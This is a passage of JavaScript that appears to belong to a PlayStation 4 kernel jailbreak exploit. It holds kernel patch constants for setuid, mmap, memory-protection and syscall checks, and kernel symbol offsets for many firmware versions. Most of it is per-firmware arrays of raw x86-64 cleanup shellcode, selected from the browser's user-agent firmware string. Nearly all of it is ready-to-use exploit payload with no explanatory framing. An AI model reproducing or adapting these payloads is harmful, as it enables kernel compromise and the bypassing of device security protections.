    'sys_setuid_patch_2':               0x74C08500, // 6.50-7.00
    'sys_mmap_patch_1':                 0x37B64037, // 5.00-7.00
    'sys_mmap_patch_2':                 0x3145C031, // 3.55-7.00
    'vm_map_protect_patch_1':           0x9090F238, // 7.00
    'vm_map_protect_patch_2':           0x90909090, // 3.55-7.00
    'amd64_syscall_patch1_1':           0x00000000, // 3.50-7.00
    'amd64_syscall_patch1_2':           0x40878B49, // 4.50-7.00
    'amd64_syscall_patch2_1':           0x00019DE9, // 6.50-7.00
    'amd64_syscall_patch2_2':           0x72909000, // 6.50-7.00
    'sys_dynlib_dlsym_patch1_1':        0x0001BDE9, // 7.00
    'sys_dynlib_dlsym_patch1_2':        0x8B489000, // 3.55-7.00
    'sys_dynlib_dlsym_patch2_1':        0x90C3C031, // 3.55-7.00
    'sys_dynlib_dlsym_patch2_2':        0x90909090, // 3.55-7.00
  };
}

// Missing: <=3.70, and all devkits
// Generate this vs making each one?
// These are from the decrypted/dumped kernel
// This is Xfast_syscall and then the objects location in relation to Xfast_syscall
// Fixes are needed for BPF Double Free and namedobj
// Xfast_syscall:
//     4.00-4.01: 0x0030EA00, 4.05: 0x0030EB30, 4.06-4.07: 0x0030EB40, 4.50-4.55: 0x003095D0, 4.70: 0x0030B840, 4.71-4.74: 0x0030B7D0, 5.00-7.00: 0x000001C0
// malloc
//     4.00-4.05: 0x0013D430, 4.06-4.07: 0x0013D440, 4.50-4.55: 0x000EE180, 4.70-4.74: 0x000ECDF0, 5.00-5.01: 0x0010DF80, 5.03-5.07: 0x0010E090
// printf
//     4.00-4.07: 0x00038A50, 4.50-4.55: 0x002F16A0‬, 4.70: 0x002F3910‬, 4.71-4.74: 0x002F38A0, 5.00-5.01: 0x00435AB0, 5.03: 0x00435E40, 5.05-5.07: 0x00435E80
// M_KQUEUE
//     4.00-4.01: 0x0104A8C0‬, 4.05: 0x0104E790, 4.06: 0x0104A780, 4.07: 0x0104E780, 4.50-4.55: 0x0165A680, 4.70: 0x1660500, 4.71-4.74: 0x01660570, 5.00-5.07: 0x014B7160

var cleanup_shcode = [];
if (fwFromUA === 3.50) {
  if (devkit === true) {
    cleanup_shcode = []; /* TODO */
  } else {
    cleanup_shcode = []; /* TODO */
  }
} else if (fwFromUA === 3.55) {
  if (devkit === true) {
    cleanup_shcode = []; /* TODO */
  } else {
    cleanup_shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0x14D02494, 0x8D4DFFCF, 0x2BD024B4, 0x8D4DFFEC, 0x8A5024AC, 0x81490003, 0x04A790C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000];
  }
} else if (fwFromUA >= 4.00 && fwFromUA <= 4.01) {
  if (devkit === true) {
    cleanup_shcode = []; /* TODO */
  } else {
    cleanup_shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0x16002494, 0x8D4DFFCF, 0x2BD024B4, 0x8D4DFFEC, 0x8A5024AC, 0x81490003, 0x04A8C0C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000];
  }
} else if (fwFromUA === 4.05) {
  if (devkit === true) {
    cleanup_shcode = []; /* TODO */
  } else {
    cleanup_shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0x14D02494, 0x8D4DFFCF, 0x2BD024B4, 0x8D4DFFEC, 0x8A5024AC, 0x81490003, 0x04A790C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000];
  }
} else if (fwFromUA === 4.06) {
  if (devkit === true) {
    cleanup_shcode = []; /* TODO */
  } else {
    cleanup_shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0x14C02494, 0x8D4DFFCF, 0x2BC024B4, 0x8D4DFFEC, 0x8A5024AC, 0x81490003, 0x04A780C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000];
  }
} else if (fwFromUA === 4.07) {
  if (devkit === true) {
    cleanup_shcode = []; /* TODO */
  } else {
    cleanup_shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0x14C02494, 0x8D4DFFCF, 0x2BC024B4, 0x8D4DFFEC, 0x8A5024AC, 0x81490003, 0x04E780C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000];
  }
} else if (fwFromUA >= 4.50 && fwFromUA <= 4.55) {
  if (devkit === true) {
    cleanup_shcode = []; /* TODO */
  } else {
    cleanup_shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0x6A302494, 0x8D4DFFCF, 0xE18024B4, 0x8D4D000E, 0xE96024AC, 0x8149FFD0, 0x65A680C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000];
  }
} else if (fwFromUA === 4.70) {
  if (devkit === true) {
    cleanup_shcode = []; /* TODO */
  } else {
    cleanup_shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0x47C02494, 0x8D4DFFCF, 0xCDF024B4, 0x8D4D000E, 0xC6F024AC, 0x8149FFD0, 0x660500C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000];
  }
} else if (fwFromUA >= 4.71 && fwFromUA <= 4.74) {
  if (devkit === true) {
    cleanup_shcode = []; /* TODO */
  } else {
    cleanup_shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0x48302494, 0x8D4DFFCF, 0xCDF024B4, 0x8D4D000E, 0xC76024AC, 0x8149FFD0, 0x660570C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000];
  }
} else if (fwFromUA >= 5.00 && fwFromUA <= 5.01) {
  if (devkit === true) {
    cleanup_shcode = []; /* TODO */
  } else {
    cleanup_shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0xFE402494, 0x8D4DFFFF, 0xDF8024B4, 0x8D4D0010, 0x5AB024AC, 0x81490043, 0x4B7160C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000];
  }
} else if (fwFromUA === 5.03) {
  if (devkit === true) {
    cleanup_shcode = []; /* TODO */
  } else {
    cleanup_shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0xFE402494, 0x8D4DFFFF, 0xE09024B4, 0x8D4D0010, 0x5E4024AC, 0x81490043, 0x4B7160C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000];
  }
} else if (fwFromUA >= 5.05 && fwFromUA <= 5.07) {
  if (devkit === true) {
    cleanup_shcode = []; /* TODO */
  } else {
    cleanup_shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0xFE402494, 0x8D4DFFFF, 0xE09024B4, 0x8D4D0010, 0x5E8024AC, 0x81490043, 0x4B7160C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000];
  }
}
